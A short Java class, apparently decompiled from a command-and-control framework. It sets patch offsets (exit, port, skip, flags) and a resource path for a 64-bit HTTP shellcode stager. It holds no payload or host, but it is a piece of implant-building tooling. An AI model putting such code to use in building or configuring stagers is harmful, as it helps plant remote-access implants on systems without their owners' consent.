package stagers;

import common.ScListener;

public abstract class GenericHTTPStagerX64 extends GenericHTTPStager {
   public GenericHTTPStagerX64(ScListener var1) {
      super(var1);
   }

   public int getExitOffset() {
      return 776;
   }

   public int getPortOffset() {
      return 271;
   }

   public int getSkipOffset() {
      return 863;
   }

   public int getFlagsOffset() {
      return 311;
   }

   public String arch() {
      return "x64";
   }

   public String getStagerFile() {
      return "resources/httpstager64.bin";
   }
}
